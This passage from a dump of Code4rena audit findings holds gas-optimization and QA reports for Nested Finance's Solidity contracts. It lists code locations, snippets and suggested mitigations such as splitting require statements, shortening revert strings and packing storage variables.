[uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L369)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L412)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L651)  ### OperatorResolver.sol  [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L40)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L60)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L75)  ### MixinOperatorResolver.sol  [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L37)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L56)  ### TimelockControllerEmergency.sol  [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L84)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L89)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L234)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L324)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Remove explicit initialization for default values.   # Mathematical optimizations  ## PROBLEM  X += Y costs `22` more gas than X = X + Y. This can mean a lot of gas wasted in a function call when the computation is repeated `n` times (loops)  ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  [amountBought -= amountFees](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L266)\\ [amountSpent += _submitOrder(address(tokenSold),_batchedOrders.orders[i].token,_nftId,_batchedOrders.orders[i],true // always to the reserve)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L370-L376)\\ [ethNeeded += _batchedOrders[i].amount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L653)  ## TOOLS USED  Manual Analysis  ## MITIGATION  use `X = X + Y` instead of `X += Y` (same with `-`)  # Require instead of AND  ## IMPACT  Require statements including conditions with the `&&` operator can be broken down in multiple require statements to save gas.  ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  [require(address(_nestedAsset) != address(0) &&  address(_nestedRecords) != address(0) &&address(_reserve) != address(0) &&address(_feeSplitter) != address(0) &&address(_weth) != address(0) &&  _operatorResolver != address(0) &&  address(_withdrawer) != address(0),  \"NF: INVALID_ADDRESS\" )](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L66-L74)  ### BeefyVaultOperator.sol  [require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BVO: INVALID_AMOUNT_RECEIVED\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L54)  ### BeefyZapBiswapLPVaultOperator.sol  [require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BLVO: INVALID_AMOUNT_RECEIVED\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L64)\\ [require(depositedAmount != 0 && amountToDeposit >= depositedAmount, \"BLVO: INVALID_AMOUNT_DEPOSITED\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L65)  ### BeefyZapUniswapLPVaultOperator.sol  [require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BLVO: INVALID_AMOUNT_RECEIVED\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L64)\\ [require(depositedAmount != 0 && amountToDeposit >= depositedAmount, \"BLVO: INVALID_AMOUNT_DEPOSITED\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L65)  ### ParaswapOperator.sol  [require(_tokenTransferProxy != address(0) && _augustusSwapper != address(0), \"PSO: INVALID_ADDRESS\")](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L16)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Break down the statements in multiple require statements.  ``` -require(_tokenTransferProxy != address(0) && _augustusSwapper != address(0), \"PSO: INVALID_ADDRESS\"); +require(_tokenTransferProxy != address(0))  +require(_augustusSwapper != address(0)); ``` You can also improve gas savings by using [custom errors](#custom-errors)   # Revert strings length  ## IMPACT  Revert strings cost more gas to deploy if the string is larger than 32 bytes. It costs `9,500` gas upon deployment per string exceeding that 32-byte size.  ## PROOF OF CONCEPT  Revert strings exceeding 32 bytes include:  ### TimelockControllerEmergency.sol  [TimelockController: length mismatch](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L229)\\ [TimelockController: length mismatch](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L230)\\ [TimelockController: operation already scheduled](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L243)\\ [TimelockController: insufficient delay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L244)\\ [TimelockController: operation cannot be cancelled](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L256)\\ [TimelockController: length mismatch](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L319)\\ [TimelockController: length mismatch](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L320)\\ [TimelockController: operation is not ready](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L334)\\ [TimelockController: missing dependency](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L335)\\ [TimelockController: operation is not ready](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L342)\\ [TimelockController: underlying transaction reverted](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L359)\\ [TimelockController: caller must be timelock](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L375)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Write the error strings so that they do not exceed 32 bytes. For further gas savings, consider also using [custom errors](#custom-errors).   # Shifting cheaper than division  ## IMPACT  A division by 2 can be calculated by shifting one to the right. While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## PROOF OF CONCEPT  Instances include:  ### BeefyZapBiswapLPVaultOperator.sol  [uint256 halfInvestment = investmentA / 2](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L275)  ### BeefyZapUniswapLPVaultOperator.sol  [uint256 halfInvestment = investmentA / 2](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L275)  ## TOOLS USED  Manual Analysis  ## MITIGATION  ``` -investmentA / 2; +investmentA >> 1; ```  # Tight Variable Packing  ## PROBLEM  Solidity contracts have contiguous 32 bytes (256 bits) slots used in storage. By arranging the variables, it is possible to minimize the number of slots used within a contract's storage and therefore reduce deployment costs.  address type variables are each of 20 bytes size (way less than 32 bytes). However, they here take up a whole 32 bytes slot (they are contiguous).  As bool type variables are of size 1 byte, there's a slot here that can get saved by moving one bool closer to an address  ## PROOF OF CONCEPT  Instances include:  ### OwnableProxyDelegation.sol  ``` address private _owner; @audit - slot 1  /// @dev Storage slot with the proxy admin (see TransparentUpgradeableProxy from OZ) bytes32 internal constant _ADMIN_SLOT = bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1);  @audit - slot 2  /// @dev True if the owner is setted bool public initialized;  @audit - slot 3 ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Place `initialized` after `_owner` to save one storage slot  ``` address private _owner; @a"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": " Note: The README lists a bunch of QA/Gas reports from prior findings, but doesn't list the specific issues found therein. Having each warden look at each report and de-dupe is just like adding more files to the scope, and I think is a bit unfair. For the ones that the sponsor has [explicitly listed](https://code4rena.com/contests/2022-06-nested-finance-contest#gas-optimizations-already-surfaced) I've still included them because the sponsor may end up finding them useful, especially after seeing the gas amounts involved, but have the lines with strike-through, so the sponsor and judge can ignore them if they wish  ## Summary  ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | 1 | Unused/empty `receive()`/`fallback()` function | 1 | | 2 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 2 |  Total: 3 instances over 2 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | 1 | Missing `initializer` modifier on constructor | 2 | | 2 | Missing `initializer` modifier | 2 | | 3 | Adding a `return` statement when the function defines a named return variable, is redundant | 4 | | 4 | `public` functions not called by the contract should be declared `external` instead | 2 | | 5 | `constant`s should be defined rather than using magic numbers | 25 | | ~~6~~ | ~~Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`~~ | ~~4~~ | | 7 | Constant redefined elsewhere | 5 | | 8 | NatSpec is incomplete | 10 | | 9 | Event is missing `indexed` fields | 8 | | 10 | Not using the named return variables anywhere in the function is confusing | 8 |  ~~Total: 70 instances over 10 issues~~ Total: 66 instances over 9 issues   ## Low Risk Issues  ### 1. Unused/empty `receive()`/`fallback()` function If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`)  *There is 1 instance of this issue:* ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #1  113:      receive() external payable {} ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L113  ### 2. Missing checks for `address(0x0)` when assigning values to `address` state variables  *There are 2 instances of this issue:* ```solidity File: contracts/operators/Yearn/YearnCurveVaultOperator.sol   #1  48:           eth = _eth; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L48  ```solidity File: contracts/abstracts/OwnableProxyDelegation.sol   #2  65:           _owner = newOwner; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L65  ## Non-critical Issues  ### 1. Missing `initializer` modifier on constructor OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors  *There are 2 instances of this issue:* ```solidity File: contracts/Withdrawer.sol   #1  16:       constructor(IWETH _weth) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/Withdrawer.sol#L16  ```solidity File: contracts/NestedFactory.sol   #2  57        constructor( 58            NestedAsset _nestedAsset, 59            NestedRecords _nestedRecords, 60            NestedReserve _reserve, 61            FeeSplitter _feeSplitter, 62            IWETH _weth, 63            address _operatorResolver, 64            Withdrawer _withdrawer 65:       ) MixinOperatorResolver(_operatorResolver) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L57-L65  ### 2. Missing `initializer` modifier The contract extends `ReentrancyGuard`/`ReentrancyGuardUpgradeable` but does not use the `initializer` modifier anywhere  *There are 2 instances of this issue:* ```solidity File: contracts/Withdrawer.sol   #1  13:   contract Withdrawer is ReentrancyGuard { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/Withdrawer.sol#L13  ```solidity File: contracts/NestedFactory.sol   #2  20:   contract NestedFactory is INestedFactory, ReentrancyGuard, OwnableProxyDelegation, MixinOperatorResolver { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L20  ### 3. Adding a `return` statement when the function defines a named return variable, is redundant  *There are 4 instances of this issue:* ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol   #1  25:                   return amounts; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L25  ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol   #2  45:                   return amounts; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L45  ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol   #3  65:                   return amounts; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L65  ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol   #4  89:                   return success; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L89  ### 4. `public` functions not called by the contract should be declared `external` instead Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.  *There are 2 instances of this issue:* ```solidity File: contracts/governance/OwnerProxy.sol   #1  16:       function execute(address _target, bytes memory _data) public payable onlyOwner returns (bytes memory response) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/OwnerProxy.sol#L16  ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #2  295       function executeEmergency( 296           address target, 297           uint256 value, 298           bytes calldata data 299:      ) public payable onlyRole(EMERGENCY_ROLE) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L295-L299  ### 5. `constant`s should be defined rather than using magic numbers Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals  *There are 25 instances of this issue:* ```solidity File: contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol  /// @audit 1000 271:          require(reserveA > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\");  /// @audit 1000 272:          require(reserveB > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L271  ```solidity File: contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol  /// @audit 1000 269:          require(reserveA > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\");  /// @audit 1000 270:          require(reserveB > 1000, \"BLVO: PAIR_RESERVE_TOO_LOW\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L269  ```solidity File: contracts/governance/OwnerProxy.sol  /// @audit 0x20 21:               let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 0)  /// @audit 0x40 24:               response := mload(0x40)  /// @audit 0x40 25:               mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))  /// @audit 0x20 25:               mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))  /// @audit 0x1f 25:               mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))  /// @audit 0x1f 25:               mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))  /// @audit 0x20 27:               returndatacopy(add(response, 0x20), 0, size)  /// @audit 0x20 32:                   revert(add(response, 0x20), size) ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/OwnerProxy.sol#L21  ```solidity File: contracts/governance/scripts/OperatorScripts.sol  /// @audit 0x20 59:               deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode)) ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L59  ```solidity File: contracts/NestedFactory.sol  /// @audit 10000 161:          require(_entryFees <= 10000, \"NF: FEES_OVERFLOW\");  /// @audit 10000 169:          require(_exitFees <= 10000, \"NF: FEES_OVERFLOW\");  /// @audit 10000 264:          uint256 amountFees = (amountBought * exitFees) / 10000; // Exit Fees  /// @audit 10000 378:          feesAmount = (amountSpent * entryFees) / 10000; // Entry Fees  /// @audit 10000 443:              feesAmount = (amountBought * (_toReserve ? entryFees : exitFees)) / 10000;  /// @audit 10000 629:          uint256 feeAmount = (_amount * exitFees) / 10000; // Exit Fee ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L161  ```solidity File: contracts/libraries/StakingLPVaultHelpers.sol  /// @audit 3 38:           } else if (poolCoinAmount == 3) {  /// @audit 3 70:           } else if (poolCoinAmount == 3) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L38  ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol  /// @audit 3 41:       ) internal view returns (uint256[3] memory amounts) {  /// @audit 3 42:           for (uint256 i; i < 3; i++) {  /// @audit 4 61:       ) internal view returns (uint256[4] memory amounts) {  /// @audit 4 62:           for (uint256 i; i < 4; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L41  ### ~~6. Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`~~  *There are 4 instances of this issue:* ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #1  25:       bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256(\"TIMELOCK_ADMIN_ROLE\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L25  ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #2  26:       bytes32 public constant PROPOSER_ROLE = keccak256(\"PROPOSER_ROLE\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L26  ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #3  27:       bytes32 public constant EXECUTOR_ROLE = keccak256(\"EXECUTOR_ROLE\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L27  ```solidity File: contracts/governance/TimelockControllerEmergency.sol   #4  28:       bytes32 public constant EMERGENCY_ROLE = keccak256(\"EMERGENCY_ROLE\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L28  ### 7. Constant redefined elsewhere Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.  *There are 5 instances of this issue:* ```solidity File: contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol  /// @audit seen in contracts/operators/Beefy/BeefyVaultOperator.sol  19:       BeefyVaultStorage public immutable operatorStorage; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L19  ```solidity File: contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol  /// @audit seen in contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol  19:       BeefyVaultStorage public immutable operatorStorage; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L19  ```solidity File: contracts/operators/Yearn/YearnCurveVaultOperator.sol  /// @audit seen in contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol  20:       YearnVaultStorage public immutable operatorStorage; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L20  ```solidity File: contracts/abstracts/MixinOperatorResolver.sol  /// @audit seen in contracts/governance/scripts/OperatorScripts.sol  17:       OperatorResolver public immutable resolver; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L17  ```solidity File: contracts/NestedFactory.sol  /// @audit seen in contracts/Withdrawer.sol  39:       IWETH public immutable weth; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L39  ### 8. NatSpec is incomplete  *There are 10 instances of this issue:* ```solidity File: contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol  /// @audit Missing: '@return' 230       /// @param path An array of the two paired token addresses 231       /// @param biswapRouter The uniswapV2 router to be used for swap and liquidity addition 232       function _swapAndAddLiquidity( 233           uint256 amount, 234           uint256 swapAmountIn, 235           address[] memory path, 236           IBiswapRouter02 biswapRouter 237:      ) private returns (uint256 mintedLpAmount) {  /// @audit Missing: '@param reserveA' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       /// @param pair The IBiswapPair to be used 264       function _getOptimalSwapAmount( 265           uint256 investmentA, 266           uint256 reserveA, 267           uint256 reserveB, 268           IBiswapRouter02 router, 269           IBiswapPair pair 270:      ) private view returns (uint256 swapAmount) {  /// @audit Missing: '@param reserveB' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       /// @param pair The IBiswapPair to be used 264       function _getOptimalSwapAmount( 265           uint256 investmentA, 266           uint256 reserveA, 267           uint256 reserveB, 268           IBiswapRouter02 router, 269           IBiswapPair pair 270:      ) private view returns (uint256 swapAmount) {  /// @audit Missing: '@param router' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       /// @param pair The IBiswapPair to be used 264       function _getOptimalSwapAmount( 265           uint256 investmentA, 266           uint256 reserveA, 267           uint256 reserveB, 268           IBiswapRouter02 router, 269           IBiswapPair pair 270:      ) private view returns (uint256 swapAmount) {  /// @audit Missing: '@return' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       /// @param pair The IBiswapPair to be used 264       function _getOptimalSwapAmount( 265           uint256 investmentA, 266           uint256 reserveA, 267           uint256 reserveB, 268           IBiswapRouter02 router, 269           IBiswapPair pair 270:      ) private view returns (uint256 swapAmount) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L230-L237  ```solidity File: contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol  /// @audit Missing: '@return' 230       /// @param path An array of the two paired token addresses 231       /// @param uniswapRouter The uniswapV2 router to be used for swap and liquidity addition 232       function _swapAndAddLiquidity( 233           uint256 amount, 234           uint256 swapAmountIn, 235           address[] memory path, 236           IUniswapV2Router02 uniswapRouter 237:      ) private returns (uint256 mintedLpAmount) {  /// @audit Missing: '@param reserveA' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       function _getOptimalSwapAmount( 264           uint256 investmentA, 265           uint256 reserveA, 266           uint256 reserveB, 267           IUniswapV2Router02 router 268:      ) private pure returns (uint256 swapAmount) {  /// @audit Missing: '@param reserveB' 258       /// @dev Calculate the optimal amount of tokenA to swap to obtain 259       ///         the same market value of tokenB after the trade. 260       ///         This allows to add as many tokensA and tokensB as possible 261       ///         to the liquidity to minimize the remaining amount. 262       /// @param investmentA The total amount of tokenA to invest 263       function _getOptimalSwapAmount( 264           uint25"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": " Note: The README lists a bunch of QA/Gas reports from prior findings, but doesn't list the specific issues found therein. Having each warden look at each report and de-dupe is just like adding more files to the scope, and I think is a bit unfair. For the ones that the sponsor has [explicitly listed](https://code4rena.com/contests/2022-06-nested-finance-contest#gas-optimizations-already-surfaced) I've still included them because the sponsor may end up finding them useful, especially after seeing the gas amounts involved, but have the lines with strike-through, so the sponsor and judge can ignore them if they wish  ## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | 1 | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 3 | | 2 | Using `storage` instead of `memory` for structs/arrays saves gas | 1 | | 3 | Multiple accesses of a mapping/array should use a local variable cache | 4 | | 4 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 2 | | ~~5~~ | ~~`<array>.length` should not be looked up in every loop of a `for`-loop~~ | ~~10~~ | | 6 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 28 | | 7 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 12 | | 8 | Optimize names to save gas | 2 | | 9 | Using `bool`s for storage incurs overhead | 1 | | 10 | It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied | 18 | | ~~11~~ | ~~`++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)~~ | ~~24~~ | | 12 | Splitting `require()` statements that use `&&` saves gas | 7 | | 13 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 6 | | 